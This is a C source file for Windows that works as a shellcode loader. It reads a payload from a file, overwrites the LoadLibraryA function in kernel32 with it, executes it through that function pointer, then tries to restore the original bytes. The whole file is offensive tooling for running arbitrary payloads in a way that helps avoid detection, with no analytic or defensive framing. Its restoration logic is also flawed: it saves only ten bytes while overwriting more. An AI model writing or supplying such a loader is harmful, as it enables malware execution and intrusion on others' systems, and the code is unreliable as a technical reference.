#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#pragma comment(lib, "kernel32.lib")

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <shellcode_file>\n", argv[0]);
        return 1;
    }

    // Read shellcode from file
    FILE *fp = fopen(argv[1], "rb");
    if (!fp) {
        printf("Error opening file: %s\n", argv[1]);
        return 1;
    }

    fseek(fp, 0, SEEK_END);
    size_t shellcode_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    unsigned char *shellcode = (unsigned char*)malloc(shellcode_size);
    if (!shellcode) {
        printf("Error allocating memory for shellcode\n");
        fclose(fp);
        return 1;
    }

    fread(shellcode, 1, shellcode_size, fp);
    fclose(fp);

    // Get the base address of kernel32.dll
    HMODULE kernel32_handle = GetModuleHandleA("kernel32.dll");
    if (!kernel32_handle) {
        printf("Error getting handle to kernel32.dll\n");
        free(shellcode);
        return 1;
    }

    // Get the address of LoadLibraryA
    FARPROC loadlibrarya_address = GetProcAddress(kernel32_handle, "LoadLibraryA");
    if (!loadlibrarya_address) {
        printf("Error getting address of LoadLibraryA\n");
        free(shellcode);
        return 1;
    }

    // Save the original bytes of LoadLibraryA
    unsigned char original_bytes[10]; // Assuming 10 bytes is enough to hold the original instructions
    SIZE_T bytes_read;
    if (!ReadProcessMemory(GetCurrentProcess(), loadlibrarya_address, original_bytes, sizeof(original_bytes), &bytes_read)) {
        printf("Error reading original bytes of LoadLibraryA\n");
        free(shellcode);
        return 1;
    }

    // Change memory protection to RW
    DWORD old_protect;
    if (!VirtualProtect(loadlibrarya_address, shellcode_size, PAGE_READWRITE, &old_protect)) {
        printf("Error changing memory protection\n");
        free(shellcode);
        return 1;
    }

    // Copy shellcode to LoadLibraryA
    memcpy(loadlibrarya_address, shellcode, shellcode_size);

    // Change memory protection back to Execute Read
    if (!VirtualProtect(loadlibrarya_address, shellcode_size, PAGE_EXECUTE_READ, &old_protect)) {
        printf("Error changing memory protection back\n");
        free(shellcode);
        return 1;
    }

    // Execute the shellcode by calling LoadLibraryA
    ((void (*)())loadlibrarya_address)();

    // Restore the original bytes of LoadLibraryA
    if (!VirtualProtect(loadlibrarya_address, sizeof(original_bytes), PAGE_READWRITE, &old_protect)) {
        printf("Error changing memory protection for restoring bytes\n");
        free(shellcode);
        return 1;
    }
    memcpy(loadlibrarya_address, original_bytes, sizeof(original_bytes));
     if (!VirtualProtect(loadlibrarya_address, sizeof(original_bytes), PAGE_EXECUTE_READ, &old_protect)) {
        printf("Error changing memory protection back after restoring bytes\n");
        free(shellcode);
        return 1;
    }

    // Free the shellcode buffer
    free(shellcode);

    return 0;
}